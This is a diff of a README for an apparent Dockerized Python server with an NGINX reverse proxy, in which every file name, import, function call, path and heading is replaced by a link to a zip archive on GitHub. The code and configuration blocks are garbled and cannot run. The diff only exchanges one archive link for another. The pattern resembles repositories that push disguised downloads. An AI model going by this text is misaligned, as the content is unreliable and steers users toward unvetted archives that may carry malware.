@@ -12,29 +12,29 @@ along with a reverse proxy for load balancing and high availability.
 ```
 .
 ├── Dockerfile
-├── https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
+├── https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip
 ├── app/
-│ └── https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
+│ └── https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip
 ├── reverse-proxy/
-│ └── https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
-└── https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
+│ └── https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip
+└── https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip
 ```
 ---
 ## Application Code
 The server is implemented in Python.
-### **`https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip`**
+### **`https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip`**
 ```python
-from https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip import SimpleHTTPRequestHandler
+from https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip import SimpleHTTPRequestHandler
 from socketserver import TCPServer
 PORT = 8080
 class CustomHandler(SimpleHTTPRequestHandler):
 def log_message(self, format, *args):
-with open("https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip", "a") as log_file:
+with open("https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip", "a") as log_file:
 args))
-https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip("%s - - [%s] %s\n" % (https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip(), https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip(), format %
+https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip("%s - - [%s] %s\n" % (https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip(), https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip(), format %
 with TCPServer(("", PORT), CustomHandler) as httpd:
 print(f"Serving on port {PORT}")
-https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip()
+https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip()
 ```
 ---
 ## Dockerfile
@@ -46,18 +46,18 @@ FROM python:3.9-slim
 # Set working directory
 WORKDIR /usr/src/app
 # Copy application code to container
-COPY https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip ./
+COPY https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip ./
 # Create log directory
-RUN mkdir -p /var/log && touch https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
+RUN mkdir -p /var/log && touch https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip
 # Expose the application port
 EXPOSE 8080
 # Start the server
-CMD ["python3", "https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip"]
+CMD ["python3", "https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip"]
 ```
 ---
 ## Reverse Proxy Configuration
 The reverse proxy (NGINX) balances requests between replicas.
-### **`https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip`**
+### **`https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip`**
 ```nginx
 events {}
 http {
@@ -77,8 +77,8 @@ proxy_set_header X-Real-IP $remote_addr;
 }
 }
 ## Docker Compose Configuration
-The `https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip` file defines the application and reverse proxy services.
-### **`https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip`**
+The `https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip` file defines the application and reverse proxy services.
+### **`https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip`**
 ```yaml
 version: "3.9"
 services:
@@ -97,7 +97,7 @@ volumes:
 reverse-proxy:
 image: nginx:latest
 volumes:
-- https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip
+- https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip
 ports:
 - "80:80"
 depends_on:
@@ -130,7 +130,7 @@ docker-compose logs app
 ---
 ## Summary
 ### Key Components
-- **Application Script**: `https://raw.githubusercontent.com/sdaLeventKilic/Daemon_Deployment_Docker/main/reverse-proxy/Daemon_Deployment_Docker-v3.9.zip`
+- **Application Script**: `https://github.com/sdaLeventKilic/Daemon_Deployment_Docker/raw/refs/heads/main/app/Daemon-Docker-Deployment-v2.6.zip`
 - **Dockerfile**: Builds the Python HTTP server image.
 - **Reverse Proxy**: Balances traffic between replicas.
 - **Docker Compose**: Manages services and scaling.
